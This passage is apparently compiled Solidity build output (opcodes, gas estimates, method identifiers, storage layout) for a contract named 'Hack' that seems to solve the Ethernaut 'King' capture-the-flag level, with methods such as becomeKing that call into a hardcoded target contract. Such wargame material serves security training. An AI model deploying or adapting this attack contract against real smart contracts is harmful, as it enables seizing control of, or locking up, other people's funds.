					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x9BF9D8DC0157AE86397961B879BD196217D8545F PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH1 0xC1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x526 DUP1 PUSH2 0xCF PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x33 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6708CC63 EQ PUSH2 0x37 JUMPI DUP1 PUSH4 0x7920D804 EQ PUSH2 0x41 JUMPI DUP1 PUSH4 0x893D20E8 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x3F PUSH2 0x95 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x55 PUSH2 0x178 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x2B8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x76 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x7F PUSH2 0x20C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8C SWAP2 SWAP1 PUSH2 0x310 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH2 0x9E PUSH2 0x178 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 DUP4 PUSH2 0xE5 SWAP2 SWAP1 PUSH2 0x356 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xF1 SWAP1 PUSH2 0x3B6 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x12B JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x130 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x174 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x16B SWAP1 PUSH2 0x424 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE3AC5D26 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1E3 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x207 SWAP2 SWAP1 PUSH2 0x470 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x8DA5CB5B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x277 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x29B SWAP2 SWAP1 PUSH2 0x4C5 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2B2 DUP2 PUSH2 0x2A0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2CB PUSH0 DUP4 ADD DUP5 PUSH2 0x2A9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2FA DUP3 PUSH2 0x2D1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x30A DUP2 PUSH2 0x2F0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x323 PUSH0 DUP4 ADD DUP5 PUSH2 0x301 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x360 DUP3 PUSH2 0x2A0 JUMP JUMPDEST SWAP2 POP PUSH2 0x36B DUP4 PUSH2 0x2A0 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x383 JUMPI PUSH2 0x382 PUSH2 0x329 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH2 0x3A1 PUSH0 DUP4 PUSH2 0x389 JUMP JUMPDEST SWAP2 POP PUSH2 0x3AC DUP3 PUSH2 0x393 JUMP JUMPDEST PUSH0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x3C0 DUP3 PUSH2 0x396 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x7472616E736174696F6E206661696C6564000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x40E PUSH1 0x11 DUP4 PUSH2 0x3CA JUMP JUMPDEST SWAP2 POP PUSH2 0x419 DUP3 PUSH2 0x3DA JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x43B DUP2 PUSH2 0x402 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x44F DUP2 PUSH2 0x2A0 JUMP JUMPDEST DUP2 EQ PUSH2 0x459 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x46A DUP2 PUSH2 0x446 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x485 JUMPI PUSH2 0x484 PUSH2 0x442 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x492 DUP5 DUP3 DUP6 ADD PUSH2 0x45C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x4A4 DUP2 PUSH2 0x2F0 JUMP JUMPDEST DUP2 EQ PUSH2 0x4AE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x4BF DUP2 PUSH2 0x49B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x4DA JUMPI PUSH2 0x4D9 PUSH2 0x442 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x4E7 DUP5 DUP3 DUP6 ADD PUSH2 0x4B1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC6 PUSH30 0x43881A4BBED1D6EB3D696D2B874A5AF6C9896FB2DC1BD201000625603291 PUSH5 0x736F6C6343 STOP ADDMOD 0x1E STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "263600",
						"executionCost": "50969",
						"totalCost": "314569"
					},
					"external": {
						"becomeKing()": "infinite",
						"getKing()": "infinite",
						"getOwner()": "infinite"
					}
				},
				"methodIdentifiers": {
					"becomeKing()": "6708cc63",
					"getKing()": "7920d804",
					"getOwner()": "893d20e8"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 76,
						"contract": "security/etheranut/King/King.sol:Hack",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_address_payable"
					},
					{
						"astId": 82,
						"contract": "security/etheranut/King/King.sol:Hack",
						"label": "king",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(King)70"
					}
				],
				"types": {
					"t_address_payable": {
						"encoding": "inplace",
						"label": "address payable",
						"numberOfBytes": "20"
					},
					"t_contract(King)70": {
						"encoding": "inplace",
						"label": "contract King",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}